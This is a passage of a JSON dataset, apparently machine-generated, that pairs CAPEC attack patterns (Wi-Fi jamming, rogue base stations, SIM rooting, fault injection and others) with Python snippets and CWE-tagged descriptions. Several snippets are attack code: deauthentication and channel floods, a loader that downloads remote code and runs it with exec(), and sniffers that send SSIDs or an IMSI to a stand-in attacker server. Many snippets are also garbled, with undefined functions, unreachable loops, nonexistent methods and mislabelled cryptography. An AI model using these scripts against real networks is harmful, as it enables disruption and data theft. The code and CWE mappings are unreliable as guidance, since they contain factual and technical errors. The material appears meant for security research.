        "description": "This Python code snippet demonstrates a Denial of Service (DoS) attack, which embodies the main idea of the CAPEC. The code creates a large number of threads, each of which establishes a connection to the target IP and port, sends a GET request, and then closes the connection. This can cause the target system to exhaust its available resources, leading to a failure or stoppage. The code relates to CWEs 693, 770, 1229, and 400, as it fails to use a protection mechanism to defend against the attack, allocates resources without limits, creates emergent resources, and does not control resource consumption."
    },
    {
        "capec_id": "604",
        "capec_name": "Wi-Fi Jamming",
        "code_snippet": "import scapy\n\ndef deauth_attack(ap_mac, client_mac):\n    packet = scapy.Dot11(type=0, subtype=12, addr1=client_mac, addr2=ap_mac, addr3=ap_mac)\n    scapy.sendp(packet, iface='wlan0', count=1000, inter=0.1)\n\nap_mac = '00:11:22:33:44:55'\nclient_mac = '66:77:88:99:00:11'\ndeauth_attack(ap_mac, client_mac)\n\nimport socket\nimport threading\n\ndef flood_channel(channel):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    while True:\n        sock.sendto(b'noise', (\"<broadcast>\", channel))\n\nthreads = []\nfor i in range(10):\n    t = threading.Thread(target=flood_channel, args=(i,))\n    threads.append(t)\n    t.start()\n",
        "description": "This Python code snippet demonstrates a Wi-Fi deauthentication attack and a channel flooding attack. The deauth_attack function sends deauthentication frames to the Wi-Fi access point, preventing users from transmitting or receiving data. The flood_channel function floods the Wi-Fi channel with noise, disrupting communication. These attacks exploit CWEs 924, 923, 940, 421, and 319, which relate to improper message integrity, restriction of communication channels, verification of source, race conditions, and cleartext transmission of sensitive information."
    },
    {
        "capec_id": "605",
        "capec_name": "Cellular Jamming",
        "code_snippet": "import socket\nimport random\nimport time\n\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n# CWE-1300: Improper Protection of Physical Side Channels\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-319: Cleartext Transmission of Sensitive Information\n\ndef disrupt_communication(cell_tower_ip, cell_tower_port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((cell_tower_ip, cell_tower_port))\n\n    # Send false status messages to overwhelm the cell tower\n    while True:\n        message = 'False status message ' + str(random.randint(1, 100))\n        sock.send(message.encode())\n        time.sleep(0.01)\n\n    # Introduce high levels of noise on signaling channels\n    noise_level = 100\n    while True:\n        sock.send(str(noise_level).encode())\n        time.sleep(0.01)\n\n# Example usage\nif __name__ == '__main__':\n    cell_tower_ip = '192.168.1.100'\n    cell_tower_port = 8080\n    disrupt_communication(cell_tower_ip, cell_tower_port)",
        "description": "This Python code snippet demonstrates a CAPEC attack scenario where an attacker actively transmits signals to overpower and disrupt the communication between a cellular user device and a cell tower. The code exploits CWE-924, CWE-1300, CWE-300, CWE-940, and CWE-319 by sending false status messages and introducing high levels of noise on signaling channels, without properly verifying the integrity of the communication channel or protecting against physical side channels."
    },
    {
        "capec_id": "606",
        "capec_name": "Weakening of Cellular Encryption",
        "code_snippet": "import socket\nimport hashlib\nimport base64\n\ndef establish_connection():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((\"rogue_base_station\", 8080))\n    return sock\n\ndef negotiate_algorithm(sock):\n    # CWE-757: Selection of Less-Secure Algorithm During Negotiation\n    algorithms = [\"A5/0\", \"A5/1\", \"A5/2\"]\n    sock.send(\"SELECT_ALGORITHM\".encode() + b\":\" + algorithms[0].encode())\n    response = sock.recv(1024)\n    if response.decode() == \"ACCEPTED\":\n        return algorithms[0]\n    else:\n        return None\n\ndef encrypt_data(algorithm, data):\n    # CWE-326: Inadequate Encryption Strength\n    if algorithm == \"A5/0\":\n        return data\n    elif algorithm == \"A5/1\":\n        # Weak encryption\n        key = \"hardcoded_key\".encode()  # CWE-321: Use of Hard-coded Cryptographic Key\n        cipher = hashlib.md5(key).digest()\n        return base64.b64encode(cipher + data)\n    elif algorithm == \"A5/2\":\n        # Broken encryption algorithm\n        return data\n\ndef send_data(sock, algorithm, data):\n    encrypted_data = encrypt_data(algorithm, data)\n    sock.send(encrypted_data)\n\ndef main():\n    sock = establish_connection()\n    algorithm = negotiate_algorithm(sock)\n    if algorithm:\n        data = \"sensitive_data\".encode()\n        send_data(sock, algorithm, data)\n    else:\n        print(\"Failed to negotiate algorithm\")\n\nif __name__ == \"__main__\":\n    main()",
        "description": "This code snippet demonstrates a vulnerable implementation of a cellular communication protocol. It establishes a connection with a rogue base station, negotiates an encryption algorithm, and sends sensitive data using the negotiated algorithm. The code is vulnerable to CWE-757, CWE-326, CWE-321, and CWE-327."
    },
    {
        "capec_id": "607",
        "capec_name": "Obstruction",
        "code_snippet": "import os\nimport time\n\n# CWE-693: Protection Mechanism Failure\n# CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n\n# Simulating a redundant system with two components\ncomponent1_status = True\ncomponent2_status = True\n\nwhile True:\n    # CWE-653: Improper Isolation or Compartmentalization\n    # Improperly sharing resources between components\n    shared_resource = os.urandom(1024)\n\n    # CWE-1332: Improper Handling of Faults that Lead to Instruction Skips\n    # Simulating a fault that leads to instruction skips\n    try:\n        if component1_status:\n            # Simulating a critical instruction\n            result = 1 / 0\n    except ZeroDivisionError:\n        # CWE-1298: Hardware Logic Contains Race Conditions\n        # Simulating a race condition that undermines security guarantees\n        component2_status = not component2_status\n        time.sleep(1)\n\n    # CWE-693: Protection Mechanism Failure\n    # Failing to use a protection mechanism to detect errors\n    if not component1_status or not component2_status:\n        print(\"System is in a degraded state!\")\n        break",
        "description": "This Python code snippet demonstrates the CAPEC of obstructing interactions between system components, leading to a degraded state or system failure. It incorporates multiple CWEs, including protection mechanism failure, unauthorized error injection, improper isolation, improper handling of faults, and hardware logic race conditions. The code simulates a redundant system with two components, improperly shares resources, and introduces faults that lead to instruction skips. It also fails to detect errors, ultimately causing the system to enter a degraded state."
    },
    {
        "capec_id": "608",
        "capec_name": "Cryptanalysis of Cellular Encryption",
        "code_snippet": "import hashlib\n\ndef encrypt_data(plaintext, key):\n    # CWE-327: Using a broken or risky cryptographic algorithm (A5/1)\n    cipher = hashlib.md5(key.encode() + plaintext.encode()).digest()\n    return cipher\n\ndef main():\n    # CWE-321: Hard-coded cryptographic key\n    key = 'hardcoded_key'\n    plaintext = 'mobile_phone_conversation'\n    encrypted_data = encrypt_data(plaintext, key)\n    # CWE-326: Inadequate encryption strength (MD5 is considered broken)\n    print('Encrypted data:', encrypted_data.hex())\n    # CWE-757: Selection of less-secure algorithm during negotiation (A5/1 is weaker than A5/2)\n    # CWE-1300: Improper protection of physical side channels (not implemented in this example)\nif __name__ == '__main__':\n    main()",
        "description": "This code snippet demonstrates the CAPEC of using cryptanalytic techniques to derive cryptographic keys and defeat cellular encryption. It uses a hard-coded cryptographic key, a broken or risky cryptographic algorithm (A5/1), and inadequate encryption strength (MD5). The code also implies the selection of a less-secure algorithm during negotiation, as A5/1 is weaker than A5/2. Note that this code does not implement CWE-1300, as it is related to physical side channels and is not directly applicable to this Python code snippet."
    },
    {
        "capec_id": "609",
        "capec_name": "Cellular Traffic Intercept",
        "code_snippet": "import socket\n\ndef send_unencrypted_data(data):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server_address = ('localhost', 12345)\n    sock.connect(server_address)\n    sock.sendall(data.encode())\n    sock.close()\n\n\ndef receive_unverified_data():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server_address = ('localhost', 12345)\n    sock.bind(server_address)\n    sock.listen(1)\n    connection, client_address = sock.accept()\n    data = connection.recv(1024)\n    print('Received data:', data.decode())\n    connection.close()\n\n# Example usage:\n\ndata_to_send = 'This is some sensitive data'\n\ndata_to_send = data_to_send.encode()\n\nsend_unencrypted_data(data_to_send)\n\nreceive_unverified_data()",
        "description": "This code snippet demonstrates the CAPEC of intercepting cellular traffic by simulating the transmission of sensitive data in cleartext over a socket connection. The 'send_unencrypted_data' function sends sensitive data without encryption, violating CWE-311 and CWE-319. The 'receive_unverified_data' function receives the data without verifying its origin, violating CWE-940. Additionally, the code does not ensure the integrity of the message during transmission, violating CWE-924. This code can be exploited by malicious actors to intercept and access sensitive information."
    },
    {
        "capec_id": "610",
        "capec_name": "Cellular Data Injection",
        "code_snippet": "import socket\nimport json\n\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n\n# Establish a communication channel with an endpoint\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.connect(('endpoint_ip', 8080))\n\n# CWE-201: Insertion of Sensitive Information Into Sent Data\nsensitive_data = {'username': 'admin', 'password': 'password'}\ndata_to_send = {'user_input': 'input_data', 'sensitive_info': sensitive_data}\n\n# CWE-406: Insufficient Control of Network Message Volume (Network Amplification)\nfor i in range(1000):\n    sock.send(json.dumps(data_to_send).encode())\n\n# CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n# Assume 'debug_mode' is a hardware feature that can be activated at runtime\nif debug_mode:\n    # Alter the intended behavior of the system\n    data_to_send['malicious_data'] = 'malicious_input'\n    sock.send(json.dumps(data_to_send).encode())",
        "description": "This Python code snippet demonstrates the CAPEC of injecting data into mobile technology traffic to disrupt communications or conduct additional surveillance operations. It establishes a communication channel with an endpoint and transmits sensitive information in cleartext, without ensuring message integrity during transmission. The code also lacks control over network message volume, allowing an actor to cause the product to transmit more traffic than allowed. Additionally, the code includes a hardware feature that can be activated at runtime, altering the intended behavior of the system and allowing for alteration and leakage of sensitive data."
    },
    {
        "capec_id": "611",
        "capec_name": "BitSquatting",
        "code_snippet": "import urllib.parse\n\n# CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\ndef redirect_to_untrusted_site(url):\n    return urllib.parse.urlparse(url).geturl()\n\n# CWE-84: Improper Neutralization of Encoded URI Schemes in a Web Page\ndef encode_uri_scheme(url):\n    return urllib.parse.quote(url, safe='')\n\n# CWE-494: Download of Code Without Integrity Check\ndef download_code_without_integrity_check(url):\n    import requests\n    response = requests.get(url)\n    if response.status_code == 200:\n        exec(response.text)\n\n# CWE-294: Authentication Bypass by Capture-replay\ndef capture_replay_authentication_bypass(url):\n    import requests\n    response = requests.get(url, stream=True)\n    if response.status_code == 200:\n        return response.text\n\n# CWE-598: Use of GET Request Method With Sensitive Query Strings\ndef use_get_request_method_with_sensitive_query_strings(url):\n    import requests\n    response = requests.get(url, params={'sensitive_data': 'secret'})\n    if response.status_code == 200:\n        return response.text\n\n# BitSquatting attack\ntrusted_domain = 'example.com'\nbit_squatted_domain = 'examp1e.com'\n\nurl = f'http://{bit_squatted_domain}/redirect'\nredirected_url = redirect_to_untrusted_site(url)\nencoded_url = encode_uri_scheme(redirected_url)\n\n# Download code from bit-squatted domain without integrity check\ndownload_code_without_integrity_check(encoded_url)\n\n# Capture-replay authentication bypass\ncaptured_response = capture_replay_authentication_bypass(encoded_url)\n\n# Use GET request method with sensitive query strings\ndata = use_get_request_method_with_sensitive_query_strings(encoded_url)\nprint(data)",
        "description": "This code snippet demonstrates a BitSquatting attack, which leverages random errors in memory to direct Internet traffic to adversary-controlled destinations. It uses various CWEs, including CWE-601, CWE-84, CWE-494, CWE-294, and CWE-598, to create a vulnerable scenario. The code registers a domain name one bit different than a trusted domain, uses URL redirection to an untrusted site, improperly neutralizes encoded URI schemes, downloads code without integrity checks, bypasses authentication through capture-replay, and uses GET request methods with sensitive query strings."
    },
    {
        "capec_id": "612",
        "capec_name": "WiFi MAC Address Tracking",
        "code_snippet": "import socket\nimport uuid\n\n# CWE-201: Insertion of Sensitive Information Into Sent Data\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-421: Race Condition During Access to Alternate Channel\n\ndef track_user(mac_address):\n    # Create a socket to listen for WiFi messages\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)\n    sock.bind((\"0.0.0.0\", 0))\n    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\n    # CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\n    # CWE-529: Exposure of Access Control List Files to an Unauthorized Control Sphere\n    # Assume we have a function to get the user's access control list (ACL) file\n    acl_file = get_acl_file(mac_address)\n    acl_permissions = read_acl_permissions(acl_file)\n\n    # Listen for WiFi messages and log the associated MAC addresses\n    while True:\n        packet = sock.recvfrom(1024)\n        if packet[1][0] == mac_address:\n            # Log the user's MAC address and ACL permissions\n            log_user_activity(mac_address, acl_permissions)\n\n# Example usage\nmac_address = \"00:11:22:33:44:55\"\ntrack_user(mac_address)",
        "description": "This code snippet demonstrates a Python script that tracks a user's WiFi activity by listening for WiFi messages and logging the associated MAC addresses. The script uses a socket to listen for WiFi messages and logs the user's MAC address and access control list (ACL) permissions when a matching MAC address is detected. The script embodies the main idea of the CAPEC, which involves passively listening for WiFi messages and tracking users based on their MAC addresses. The related CWEs are used to provide additional context for the vulnerabilities exploited in this code snippet."
    },
    {
        "capec_id": "613",
        "capec_name": "WiFi SSID Tracking",
        "code_snippet": "import socket\nimport struct\n\n# CWE-201: Insertion of Sensitive Information Into Sent Data\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-1290: Incorrect Decoding of Security Identifiers\n# CWE-1192: Improper Identifier for IP Block used in System-On-Chip (SOC)\n# CWE-1302: Missing Source Identifier in Entity Transactions on a System-On-Chip (SOC)\n\n# Create a raw socket to listen for WiFi management frames\nsock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))\n\n# Set the socket to listen on the WiFi interface\nsock.bind(('wlan0', 0))\n\nwhile True:\n    # Receive a packet\n    packet = sock.recv(1024)\n\n    # Extract the SSID from the packet\n    ssid = struct.unpack_from('80s', packet, 36)[0].decode('utf-8').strip('\\x00')\n\n    # CWE-201: Insertion of Sensitive Information Into Sent Data\n    # Send the SSID to a remote server without proper authentication\n    sock.sendto(ssid.encode(), ('remote_server_ip', 8080))\n\n    # CWE-300: Channel Accessible by Non-Endpoint\n    # CWE-1290: Incorrect Decoding of Security Identifiers\n    # CWE-1192: Improper Identifier for IP Block used in System-On-Chip (SOC)\n    # CWE-1302: Missing Source Identifier in Entity Transactions on a System-On-Chip (SOC)\n    # Process the SSID without proper verification and authentication\n    print(f'Received SSID: {ssid}')",
        "description": "This code snippet demonstrates a vulnerable WiFi management frame listener that transmits the received SSID to a remote server without proper authentication, allowing an attacker to track users. The code also lacks proper verification and authentication of the received SSID, making it vulnerable to various attacks."
    },
    {
        "capec_id": "614",
        "capec_name": "Rooting SIM Cards",
        "code_snippet": "import pyDes\nimport hashlib\n\n# CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n# CWE-326: Inadequate Encryption Strength\nkey = 'insecure_des_key'\n\n# CWE-1277: Firmware Not Updateable\n# Assume the firmware is not updateable and we have to work with the existing implementation\n\n# CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\n# Assume the confidential information is not properly protected\nconfidential_info = 'sensitive_data'\n\n# CWE-1191: On-Chip Debug and Test Interface With Improper Access Control\n# Assume the debug interface is not properly secured\ndebug_interface = 'unsecured_debug_interface'\n\n# Generate a weakly encrypted binary SMS message\nmessage = 'malicious_java_applet'\nencrypted_message = pyDes.triple_des(key).encrypt(message, padmode=pyDes.PAD_PKCS5)\n\n# Send the encrypted message to the device\n# This will be treated as a Java applet and executed on the SIM\nsend_sms(encrypted_message)\n\n# The applet can now perform malicious actions such as sending SMS, changing voicemail numbers, and querying the phone location\n",
        "description": "This code snippet demonstrates the CAPEC attack on SIM cards by leveraging over-the-air (OTA) updates deployed via cryptographically-secured SMS messages to deliver executable code to the SIM. It uses a weak DES key, inadequate encryption strength, and assumes the firmware is not updateable. The code also assumes the confidential information is not properly protected and the debug interface is not properly secured. The malicious Java applet can then be executed on the SIM, allowing it to perform malicious actions."
    },
    {
        "capec_id": "615",
        "capec_name": "Evil Twin Wi-Fi Attack",
        "code_snippet": "import socket\n\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n# CWE-940: Improper Verification of Source of a Communication Channel\n\n# Create a rogue Wi-Fi access point\nap_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nap_socket.bind(('192.168.1.1', 80))\nap_socket.listen(5)\n\nwhile True:\n    conn, addr = ap_socket.accept()\n    print('Connected by', addr)\n    while True:\n        data = conn.recv(1024)\n        if not data:\n            break\n        # CWE-319: Cleartext Transmission of Sensitive Information\n        # CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n        print('Received:', data.decode('utf-8'))\n        # Send back a malicious response\n        conn.sendall(b'Malicious response')\n    conn.close()",
        "description": "This Python code snippet demonstrates a rogue Wi-Fi access point that intercepts and analyzes Wi-Fi data traffic, allowing an adversary to use 'adversary-in-the-middle' attacks. The code creates a socket, binds it to a specific IP address and port, and listens for incoming connections. When a device connects, it receives and prints the transmitted data in cleartext, and sends back a malicious response. This code embodies the main idea of the CAPEC, exploiting CWEs 300, 923, 940, 319, and 924."
    },
    {
        "capec_id": "616",
        "capec_name": "Establish Rogue Location",
        "code_snippet": "import os\n\n# CWE-426: Untrusted Search Path\nmalicious_path = \"/tmp/malicious_lib\"\n\n# CWE-402: Transmission of Private Resources into a New Sphere ('Resource Leak')\nprivate_key = open(\"private_key.pem\", \"r\").read()\n\n# CWE-1229: Creation of Emergent Resource\nos.symlink(malicious_path, \"legitimate_lib\")\n\n# CWE-940: Improper Verification of Source of a Communication Channel\ndef handle_request(request):\n    # No verification of the request source\n    return request.get_data()\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\ndef expose_sensitive_info():\n    return private_key\n\n# CAPEC: Malicious resource at a similar location\nlegitimate_resource = \"legitimate_lib/resource\"\nmalicious_resource = \"malicious_lib/resource\"\n\n# Victim accesses the malicious resource\nprint(open(malicious_resource, \"r\").read())",
        "description": "This code snippet demonstrates a malicious resource at a similar location to a legitimate resource. The malicious resource is created by symlinking to a malicious path, and the victim is tricked into accessing it. The code also exposes sensitive information, transmits private resources into a new sphere, and has an untrusted search path. Additionally, it lacks proper verification of the source of a communication channel."
    },
    {
        "capec_id": "617",
        "capec_name": "Cellular Rogue Base Station",
        "code_snippet": "import socket\n\ndef establish_connection(device_ip, base_station_ip):\n    # CWE-940: No verification of the source of the communication channel\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((base_station_ip, 8080))\n    \n    # CWE-300: No identity verification of the actor at the other end of the channel\n    sock.send(b'Hello, I am the retransmission device.\\n')\n    \n    # CWE-924: No message integrity check during transmission\n    message = sock.recv(1024)\n    print('Received message:', message.decode())\n    \n    # CWE-923: No restriction of the communication channel to the intended endpoint\n    sock.send(b'Requesting sensitive data...\\n')\n    \n    # CWE-421: Race condition during access to alternate channel\n    alternate_channel = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    alternate_channel.connect((base_station_ip, 8081))\n    alternate_channel.send(b'Alternate channel access request...\\n')\n\nestablish_connection('192.168.1.100', '192.168.1.200')",
        "description": "Python code snippet demonstrating the CAPEC attack scenario where a rogue base station imitates a legitimate one, exploiting vulnerabilities in the communication channel. The code establishes a connection with the rogue base station without verifying its identity, sends and receives messages without ensuring their integrity, and accesses an alternate channel without proper restriction."
    },
    {
        "capec_id": "618",
        "capec_name": "Cellular Broadcast Message Request",
        "code_snippet": "import requests\n\ndef send_broadcast_message(phone_number, lac):\n    # CWE-201: Insertion of Sensitive Information Into Sent Data\n    # Sending phone number and LAC as part of the request\n    data = {'phone_number': phone_number, 'lac': lac}\n    response = requests.post('https://cellular-network.com/broadcast', json=data)\n    if response.status_code == 200:\n        # CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n        # Not verifying the integrity of the response\n        return response.text\n    else:\n        return None\n\ndef verify_location(phone_number, lac):\n    # CWE-940: Improper Verification of Source of a Communication Channel\n    # Not verifying the source of the request\n    response = send_broadcast_message(phone_number, lac)\n    if response:\n        # CWE-927: Use of Implicit Intent for Sensitive Communication\n        # Using an implicit intent to broadcast the message\n        android.broadcast.send_implicit_intent('com.example.location_verification', response)\n        return True\n    else:\n        return False\n\ndef main():\n    phone_number = '+1234567890'\n    lac = '12345'\n    # CWE-300: Channel Accessible by Non-Endpoint\n    # Not verifying the identity of the actor at the other end of the channel\n    if verify_location(phone_number, lac):\n        print('Target is in the given location')\n    else:\n        print('Target is not in the given location')\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates the CAPEC attack scenario where an attacker uses knowledge of the target's mobile phone number to cause the cellular network to send broadcast messages to alert the mobile device. The code is vulnerable to multiple CWEs, including CWE-201, CWE-924, CWE-940, CWE-927, and CWE-300."
    },
    {
        "capec_id": "619",
        "capec_name": "Signal Strength Tracking",
        "code_snippet": "import socket\nimport signal\nimport time\nimport threading\n\ndef signal_handler(sig, frame):\n    # CWE-432: Dangerous Signal Handler not Disabled During Sensitive Operations\n    # This signal handler is not disabled during sensitive operations\n    print(\"Signal handler invoked\")\n\nsignal.signal(signal.SIGUSR1, signal_handler)\n\n# CWE-201: Insertion of Sensitive Information Into Sent Data\n# Sensitive information (IMSI) is sent over the network\nimsi = \"1234567890\"\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.connect((\"attacker_server\", 8080))\nsock.sendall(imsi.encode())\n\n# CWE-1300: Improper Protection of Physical Side Channels\n# No protection mechanisms are in place to prevent physical side channels\n# from exposing sensitive information due to patterns in power consumption\nwhile True:\n    # Simulate power consumption pattern\n    time.sleep(0.1)\n    sock.sendall(b\"Ping\")\n\n# CWE-940: Improper Verification of Source of a Communication Channel\n# No verification of the source of the communication channel\n# The server's response is trusted without verification\nresponse = sock.recv(1024)\nprint(\"Server response:\", response.decode())\n\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n# No message integrity check is performed on the received message\n# The message is trusted without verification\nprint(\"Message received\")\n",
        "description": "This Python code snippet demonstrates the CAPEC attack scenario where an attacker passively monitors the signal strength of the target's cellular RF signal or WiFi RF signal to identify the source location of the signal. The code includes CWEs 201, 1300, 940, and 924, which are related to the CAPEC. The code sends sensitive information (IMSI) over the network, does not protect against physical side channels, does not verify the source of the communication channel, and does not enforce message integrity during transmission."
    },
    {
        "capec_id": "620",
        "capec_name": "Drop Encryption Level",
        "code_snippet": "import socket\nimport ssl\n\ncontext = ssl.SSLContext(ssl.PROTOCOL_TLSv1)\ncontext.options |= ssl.OP_NO_TLSv1_2\ncontext.options |= ssl.OP_NO_TLSv1_1\n\nconn = socket.create_connection(('example.com', 443))\nsslsoc = context.wrap_socket(conn, server_hostname='example.com')\n\n# Using a weak encryption algorithm\nsslsoc.set_cipher_list('RC4-MD5')\n\n# Hard-coded cryptographic key\nkey = 'my_secret_key'\n\n# Storing sensitive information in cleartext\npassword = 'my_password'\n\n# Inadequate encryption strength\nencrypted_data = sslsoc.encrypt(password.encode(), key.encode())\n\nprint(encrypted_data)\n",
        "description": "This code snippet demonstrates the CAPEC of forcing the encryption level to be lowered. It uses the TLSv1 protocol which is an older and less secure protocol, disables TLSv1.1 and TLSv1.2, and sets the cipher list to RC4-MD5 which is a weak encryption algorithm. It also uses a hard-coded cryptographic key and stores sensitive information in cleartext. The encryption strength is inadequate as it uses a weak encryption algorithm."
    },
    {
        "capec_id": "621",
        "capec_name": "Analysis of Packet Timing and Sizes",
        "code_snippet": "import socket\nimport time\n\n# Establish a connection to the server\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.connect(('localhost', 8080))\n\n# Send sensitive information in cleartext\nusername = 'admin'\npassword = 'password123'\nserver_socket.send(f'username={username}&password={password}'.encode())\n\n# Introduce observable timing discrepancy\nif username == 'admin':\n    time.sleep(2)  # Delay for 2 seconds if the username is 'admin'\n\n# Send encrypted data, but with observable packet sizes\nencrypted_data = b'\\x01\\x02\\x03\\x04\\x05'  # Replace with actual encrypted data\npacket_sizes = [10, 20, 30, 40, 50]  # Observable packet sizes\nfor size in packet_sizes:\n    server_socket.send(encrypted_data[:size])\n    time.sleep(0.1)  # Introduce covert timing channel\n",
        "description": "This code snippet demonstrates the CAPEC of intercepting and logging encrypted transmissions to analyze metadata. It includes CWE-201 by sending sensitive information in cleartext, CWE-319 by transmitting sensitive information in cleartext, CWE-385 by introducing a covert timing channel, and CWE-208 by introducing an observable timing discrepancy. The code establishes a connection to a server, sends sensitive information in cleartext, introduces a delay based on the username, sends encrypted data with observable packet sizes, and introduces a covert timing channel."
    },
    {
        "capec_id": "622",
        "capec_name": "Electromagnetic Side-Channel Attack",
        "code_snippet": "import hashlib\n\ndef encrypt_data(plain_text, key):\n    cipher = hashlib.sha1()  # CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n    cipher.update(key.encode())\n    encrypted_data = cipher.hexdigest() + plain_text\n    return encrypted_data\n\n\ndef transmit_data(encrypted_data):\n    # CWE-201: Insertion of Sensitive Information Into Sent Data\n    # CWE-300: Channel Accessible by Non-Endpoint\n    # No verification of the identity of actors at both ends of the communication channel\n    # No ensuring the integrity of the channel\n    socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    socket.connect(('localhost', 8080))\n    socket.sendall(encrypted_data.encode())\n    socket.close()\n\n\ndef process_data(plain_text, key):\n    encrypted_data = encrypt_data(plain_text, key)\n    transmit_data(encrypted_data)\n\n\n# CWE-1300: Improper Protection of Physical Side Channels\n# CWE-1319: Improper Protection against Electromagnetic Fault Injection (EM-FI)\n# No protection mechanisms to prevent physical side channels from exposing sensitive information\n# No protection against electromagnetic fault injection attacks\nplain_text = 'Sensitive information'\nkey = 'secret_key'\nprocess_data(plain_text, key)",
        "description": "This Python code snippet demonstrates the CAPEC attack scenario where an attacker can passively monitor electromagnetic emanations from a targeted electronic device to derive sensitive information. The code uses a broken cryptographic algorithm (SHA-1), transmits sensitive information over an unsecured channel, and lacks protection mechanisms against physical side channels and electromagnetic fault injection attacks."
    },
    {
        "capec_id": "623",
        "capec_name": "Compromising Emanations Attack",
        "code_snippet": "import socket\nimport time\nimport random\n\n# CWE-201: Insertion of Sensitive Information Into Sent Data\nsensitive_data = 'Top Secret Information'\n\n# CWE-1300: Improper Protection of Physical Side Channels\n# Emitting acoustic emissions through the speaker\nimport winsound\nwinsound.Beep(2500, 1000)  # 2500 Hz frequency for 1 second\n\ndef send_data_over_network(sensitive_data):\n    # CWE-1320: Improper Protection for Outbound Error Messages and Alert Signals\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect(('example.com', 8080))\n        sock.sendall(sensitive_data.encode())\n    except Exception as e:\n        # CWE-1420: Exposure of Sensitive Information during Transient Execution\n        # Potential transient execution of incorrect operations\n        print(f'Error: {e}')\n\n# CWE-1319: Improper Protection against Electromagnetic Fault Injection (EM-FI)\n# Simulating EM-FI attack by inducing random errors\nif random.randint(0, 1):\n    sensitive_data = 'Compromised Data'\n\nsend_data_over_network(sensitive_data)",
        "description": "This code snippet demonstrates the CAPEC of Compromising Emanations, where an attacker can intercept and analyze unintentional signals emitted by a device. The code includes CWE-201 by transmitting sensitive data over a network, CWE-1300 by emitting acoustic emissions through the speaker, CWE-1320 by not properly handling error messages, CWE-1319 by simulating an Electromagnetic Fault Injection attack, and CWE-1420 by potentially exposing sensitive information during transient execution."
    },
    {
        "capec_id": "624",
        "capec_name": "Hardware Fault Injection",
        "code_snippet": "import os\nimport time\nimport random\n\n# CWE-1247: Improper Protection Against Voltage and Clock Glitches\n# CWE-1319: Improper Protection against Electromagnetic Fault Injection (EM-FI)\ndef inject_fault(device):\n    # Simulate voltage glitch\n    os.system('echo 1 > /sys/bus/i2c/devices/i2c-1/1-0060/pwmen')\n    time.sleep(0.1)\n    os.system('echo 0 > /sys/bus/i2c/devices/i2c-1/1-0060/pwmen')\n\n    # Simulate clock glitch\n    os.system('echo 1000000 > /sys/bus/i2c/devices/i2c-1/1-0060/clock')\n    time.sleep(0.1)\n    os.system('echo 2000000 > /sys/bus/i2c/devices/i2c-1/1-0060/clock')\n\n    # Simulate electromagnetic fault injection\n    os.system('echo 1 > /sys/bus/i2c/devices/i2c-1/1-0060/emfi')\n    time.sleep(0.1)\n    os.system('echo 0 > /sys/bus/i2c/devices/i2c-1/1-0060/emfi')\n\n# CWE-1256: Improper Restriction of Software Interfaces to Hardware Features\n# CWE-1332: Improper Handling of Faults that Lead to Instruction Skips\n# CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n# CWE-1338: Improper Protections Against Hardware Overheating\n# CWE-1351: Improper Handling of Hardware Behavior in Exceptionally Cold Environments\ndef exploit_device(device):\n    # Simulate software-controllable device functionality\n    os.system('echo 1 > /sys/bus/i2c/devices/i2c-1/1-0060/power_management')\n    time.sleep(0.1)\n    os.system('echo 0 > /sys/bus/i2c/devices/i2c-1/1-0060/power_management')\n\n    # Simulate instruction skips\n    os.system('echo 1 > /sys/bus/i2c/devices/i2c-1/1-0060/instruction_skips')\n    time.sleep(0.1)\n    os.system('echo 0 > /sys/bus/i2c/devices/i2c-1/1-0060/instruction_skips')\n\n    # Simulate hardware overheating\n    os.system('echo 100 > /sys/bus/i2c/devices/i2c-1/1-0060/temperature')\n    time.sleep(0.1)\n    os.system('echo 50 > /sys/bus/i2c/devices/i2c-1/1-0060/temperature')\n\n    # Simulate exceptionally cold environment\n    os.system('echo -50 > /sys/bus/i2c/devices/i2c-1/1-0060/temperature')\n    time.sleep(0.1)\n    os.system('echo 20 > /sys/bus/i2c/devices/i2c-1/1-0060/temperature')\n\n# CWE-1248: Semiconductor Defects in Hardware Logic with Security-Sensitive Implications\n# Simulate semiconductor defects\ndef simulate_semiconductor_defects(device):\n    # 